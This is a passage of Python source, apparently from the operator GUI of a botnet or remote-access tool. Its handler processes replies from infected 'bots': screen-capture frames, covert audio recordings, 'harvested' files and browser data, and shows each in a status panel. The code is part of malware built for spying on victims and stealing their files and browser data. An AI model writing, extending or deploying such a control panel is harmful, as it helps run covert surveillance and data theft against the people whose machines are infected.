        self.update_status("Getting network info...", "#3498db")
        
    def handle_command_response(self, response: Dict[str, Any]):
        """Handle response from bot command"""
        try:
            command_type = response.get('type', 'unknown')
            
            if command_type == 'screen_frame':
                # Update stream viewer
                self.stream_viewer.setText(f"Frame #{response.get('frame_number', 0)} received")
                
            elif command_type == 'audio_recording':
                # Update audio status
                duration = response.get('duration', 0)
                size = response.get('size', 0)
                self.audio_status.append(f"Audio recorded: {duration}s, {size} bytes")
                
            elif command_type == 'file_harvest':
                # Update harvest status
                files_count = response.get('files_count', 0)
                total_size = response.get('total_size', 0)
                self.harvest_status.append(f"Harvested: {files_count} files, {total_size} bytes")
                
            elif command_type.startswith('browser_'):
                # Update browser status
                data = response.get('data', {})
                self.browser_status.append(f"Browser data: {json.dumps(data, indent=2)}")
                
            self.update_status("Command completed", "#27ae60")
            
        except Exception as e:
            self.update_status(f"Error: {str(e)}", "#e74c3c")